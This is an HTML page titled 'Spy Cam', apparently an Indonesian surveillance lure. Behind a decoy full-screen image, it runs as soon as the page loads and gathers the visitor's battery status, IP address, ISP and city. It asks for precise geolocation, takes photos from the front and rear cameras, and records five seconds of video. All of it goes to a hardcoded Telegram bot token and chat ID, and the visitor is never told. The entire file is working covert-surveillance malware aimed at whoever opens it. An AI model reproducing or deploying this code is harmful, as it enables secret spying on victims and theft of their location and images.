<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Cam</title>
</head>
<body style="margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: black;">
    <img id="displayImage" src="https://img12.pixhost.to/images/804/574487749_fikxzxmodz-developer.jpg" style="width: 100%; height: 100vh; object-fit: cover;">

    <script>
        const BOT_TOKEN = "7575375182:AAHQeA5jdew2tMO5Znh9_zBqi4pwFnWUmCg";  
        const CHAT_ID = "7081489041";  

        async function getBatteryStatus() {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return `Baterai: ${Math.round(battery.level * 100)}% (${battery.charging ? 'Sedang Mengisi' : 'Tidak Mengisi'})`;
            }
            return "Baterai: Tidak Diketahui";
        }

        async function getIPInfo() {
            try {
                const res = await fetch("https://ipapi.co/json/");
                const data = await res.json();
                return `IP: ${data.ip}\nISP: ${data.org}\nKota: ${data.city}, ${data.region}, ${data.country_name}`;
            } catch {
                return "IP Info: Tidak Diketahui";
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve(`Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                    () => resolve("Lokasi: Ditolak oleh pengguna")
                );
            });
        }

        async function captureImage(facingMode) {
            return new Promise(async (resolve, reject) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                        stream.getTracks().forEach(track => track.stop());

                        canvas.toBlob(blob => resolve(blob), "image/jpeg");
                    }, 2000);
                } catch (error) {
                    reject(error);
                }
            });
        }

        async function recordVideo() {
            return new Promise(async (resolve, reject) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const mediaRecorder = new MediaRecorder(stream);
                    let chunks = [];

                    mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
                    mediaRecorder.onstop = () => {
                        stream.getTracks().forEach(track => track.stop());
                        resolve(new Blob(chunks, { type: "video/webm" }));
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000); // Rekam 5 detik
                } catch (error) {
                    reject(error);
                }
            });
        }

        async function sendToTelegram() {
            try {
                const [battery, ipInfo, location] = await Promise.all([getBatteryStatus(), getIPInfo(), getLocation()]);
                const caption = `ðŸ“Œ *Data Pengguna*\n\n${battery}\n${ipInfo}\n${location}`;

                const frontImage = await captureImage("user");
                const backImage = await captureImage("environment");
                const video = await recordVideo();

                const sendFile = async (type, file, captionText) => {
                    const formData = new FormData();
                    formData.append(type, file, `${type}.${type === "photo" ? "jpg" : "webm"}`);
                    formData.append("chat_id", CHAT_ID);
                    formData.append("caption", captionText);
                    formData.append("parse_mode", "Markdown");

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "photo" ? "Photo" : "Video"}`, {
                        method: "POST",
                        body: formData
                    });
                };

                await sendFile("photo", frontImage, `ðŸ“¸ Kamera Depan\n\n${caption}`);
                await sendFile("photo", backImage, `ðŸ“¸ Kamera Belakang\n\n${caption}`);
                await sendFile("video", video, `ðŸ“¹ Video Kamera Depan\n\n${caption}`);

            } catch (error) {
                console.error("Gagal mengirim data:", error);
            }
        }

        sendToTelegram();
    </script>
</body>
</html>
